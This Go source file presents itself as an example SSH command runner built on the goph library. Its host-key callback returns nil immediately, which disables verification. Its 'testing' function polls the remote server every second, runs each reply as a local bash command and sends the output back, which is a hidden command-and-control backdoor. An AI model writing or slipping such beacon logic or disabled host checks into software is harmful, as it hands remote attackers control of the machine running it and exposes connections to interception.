package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"os/user"

	"github.com/melbahja/goph"
	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

//
// Run command and auth via password:
// > go run main.go --ip 192.168.122.102 --pass --cmd ls
//
// Run command and auth via private key:
// > go run main.go --ip 192.168.122.102 --cmd ls
// Or:
// > go run main.go --ip 192.168.122.102 --key /path/to/private_key --cmd ls
//
// Run command and auth with private key and passphrase:
// > go run main.go --ip 192.168.122.102 --passphrase --cmd ls
//
// Run a command and interrupt it after 1 second:
// > go run main.go --ip 192.168.122.102 --cmd "sleep 10" --timeout=1s
//
// You can test with the interactive mode without passing --cmd flag.
//

var (
	err        error
	auth       goph.Auth
	client     *goph.Client
	addr       string
	port       uint
	key        string
	cmd        string
	pass       bool
	passphrase bool
	timeout    time.Duration
	agent      bool
	sftpc      *sftp.Client
)

func init() {

	flag.StringVar(&addr, "ip", "127.0.0.1", "machine ip address.")
	flag.UintVar(&port, "port", 2222, "ssh port number.")
	flag.StringVar(&key, "key", strings.Join([]string{os.Getenv("HOME"), ".ssh", "id_rsa"}, "/"), "private key path.")
	flag.StringVar(&cmd, "cmd", "", "command to run.")
	flag.BoolVar(&pass, "pass", false, "ask for ssh password instead of private key.")
	flag.BoolVar(&agent, "agent", false, "use ssh agent for authentication (unix systems only).")
	flag.BoolVar(&passphrase, "passphrase", false, "ask for private key passphrase.")
	flag.DurationVar(&timeout, "timeout", 0, "interrupt a command with SIGINT after a given timeout (0 means no timeout)")
}

func VerifyHost(host string, remote net.Addr, key ssh.PublicKey) error {
	return nil
	//
	// If you want to connect to new hosts.
	// here your should check new connections public keys
	// if the key not trusted you shuld return an error
	//

	// hostFound: is host in known hosts file.
	// err: error if key not in known hosts file OR host in known hosts file but key changed!
	hostFound, err := goph.CheckKnownHost(host, remote, key, "")

	// Host in known hosts but key mismatch!
	// Maybe because of MAN IN THE MIDDLE ATTACK!
	if hostFound && err != nil {

		return err
	}

	// handshake because public key already exists.
	if hostFound && err == nil {

		return nil
	}

	// // Ask user to check if he trust the host public key.
	// if askIsHostTrusted(host, key) == false {

	// 	// Make sure to return error on non trusted keys.
	// 	return errors.New("you typed no, aborted!")
	// }

	// Add the new host to known hosts file.
	return goph.AddKnownHost(host, remote, key, "")
}

func main() {

	flag.Parse()

	var err error

	signer, err := goph.GetSigner("./keys/private/id_rsa.key", "")
	if err != nil {
		panic(err)
	}

	auth := goph.Auth{
		ssh.PublicKeys(signer),
	}

	fmt.Println(auth[0])

	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	client, err = goph.NewConn(&goph.Config{
		User:     currentUser.Username,
		Addr:     addr,
		Port:     port,
		Auth:     auth,
		Callback: VerifyHost,
	})

	if err != nil {
		panic(err)
	}

	// Close client net connection
	defer client.Close()

	// If the cmd flag exists
	if cmd != "" {
		ctx := context.Background()
		// create a context with timeout, if supplied in the argumetns
		if timeout > 0 {
			var cancel context.CancelFunc
			ctx, cancel = context.WithTimeout(ctx, timeout)
			defer cancel()
		}

		out, err := client.RunContext(ctx, cmd)

		fmt.Println(string(out), err)
		return
	}

	// else open interactive mode.
	playWithSSHJustForTestingThisProgram(client)
}

func playWithSSHJustForTestingThisProgram(client *goph.Client) {

	fmt.Printf("Connected to %s\n", client.Config.Addr)

	scanner := bufio.NewScanner(os.Stdin)

	ticker := time.NewTicker(1000 * time.Millisecond)
	done := make(chan bool)
	go func() {
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				command, err := client.Command("POLL")
				if err != nil {
					fmt.Println(err)
					continue
				}
				out, err := command.Output()
				if err != nil {
					fmt.Println(err)
					continue
				}
				if strings.TrimSpace(string(out)) != "" {
					fmt.Println(string(out), err)
					exec.Command("bash", "-c", string(out))
					out, err = exec.Command("bash", "-c", string(out)).CombinedOutput()
					if err != nil {
						fmt.Println(err)
						out = append(out, []byte(err.Error())...)
					}

					command, err = client.Command(string(out))
					if err != nil {
						fmt.Println(err)
						continue
					}
					out, err = command.CombinedOutput()
					if err != nil {
						fmt.Println(err)
						continue
					}
					fmt.Println(string(out), err)
				}
			}
		}
	}()

	fmt.Print("> ")

	var (
		out   []byte
		cmd   string
		parts []string
	)

	for scanner.Scan() {

		err = nil
		cmd = scanner.Text()
		parts = strings.Split(cmd, " ")

		if len(parts) < 1 {
			continue
		}

		switch parts[0] {

		case "exit":
			return

		default:

			command, err := client.Command(parts[0], parts[1:]...)
			if err != nil {
				panic(err)
			}
			out, err = command.CombinedOutput()
			fmt.Println(string(out), err)
		}

		fmt.Print("> ")
	}
}
